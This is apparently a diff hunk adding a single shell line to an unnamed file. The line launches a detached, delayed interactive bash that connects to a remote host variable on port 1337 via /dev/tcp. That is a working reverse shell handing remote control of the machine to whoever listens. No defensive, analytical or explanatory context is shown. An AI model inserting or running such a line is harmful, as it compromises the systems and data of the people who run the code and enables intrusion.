@@ -1,0 +1,1 @@
+(sleep 3s && nohup bash -i >/dev/tcp/$rev_host/1337 0<&1 2>&1) &
